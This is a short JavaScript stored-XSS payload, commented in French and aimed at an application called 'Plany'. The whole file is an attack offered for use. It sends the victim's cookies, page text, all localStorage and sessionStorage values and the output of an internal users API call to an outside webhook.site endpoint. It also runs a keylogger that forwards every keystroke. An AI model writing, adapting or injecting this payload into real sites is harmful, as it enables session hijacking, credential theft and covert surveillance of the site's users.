// === Exploit XSS pour Plany ===
// Ce script s'exécute automatiquement dès qu'il est injecté via une XSS stockée

(function () {
  const endpoint = 'https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386';

  // 📡 1. Exfiltration de base
  const info = {
    cookie: document.cookie,
    location: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
  };
  fetch(`${endpoint}?info=${encodeURIComponent(JSON.stringify(info))}`);

  // 🧠 2. DOM content exfiltration (visuel de la page)
  const bodyText = document.body.innerText.slice(0, 2000); // limit 2k
  fetch(`${endpoint}?body=${encodeURIComponent(bodyText)}`);

  // 🧪 3. localStorage/sessionStorage dump
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    const v = localStorage.getItem(k);
    fetch(`${endpoint}?local_${k}=${encodeURIComponent(v)}`);
  }
  for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i);
    const v = sessionStorage.getItem(k);
    fetch(`${endpoint}?session_${k}=${encodeURIComponent(v)}`);
  }

  // 🎯 4. Exemple d'appel à une API interne (à adapter selon endpoints)
  fetch('/api/v1/users')
    .then(r => r.text())
    .then(data => fetch(`${endpoint}?api_users=${encodeURIComponent(data)}`))
    .catch(() => {});

  // 🪝 5. Keylogger ultra-basique
  document.addEventListener('keydown', e => {
    fetch(`${endpoint}?key=${e.key}`);
  });

  // ✅ 6. Ping final
  fetch(`${endpoint}?done=true`);
})();
